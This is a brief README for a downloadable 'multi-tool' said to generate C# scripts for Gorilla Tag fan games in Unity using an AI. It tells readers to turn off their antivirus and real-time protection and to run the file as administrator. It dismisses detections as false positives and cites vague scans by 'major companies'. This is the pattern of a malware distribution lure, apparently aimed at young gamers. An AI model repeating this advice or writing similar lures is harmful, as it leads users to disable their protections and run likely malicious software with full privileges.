# multi-tool
This is a simple multi-tool for making Gorilla Tag fan games / Gorilla Tag copys and building scripts for C#. Everything here has been scanned and searched for viruses by major companies, and as stated by them, it is simply a false positive if detected.

To download the file, you need to disable your antivirus, as it creates C# scripts that Windows dislikes when generated by another application. To fix this, go to your antivirus program, such as Windows Defender or any other third-party antivirus you may have. Then, disable everything there, mainly real-time protection. Run the app as an administrator, and you're good to go.

After you download the file, run it as an administrator. A box should pop up from there, type in the script you want into the AI. Then select the Unity project where you want the AI to create the script, and let the AI do its work.
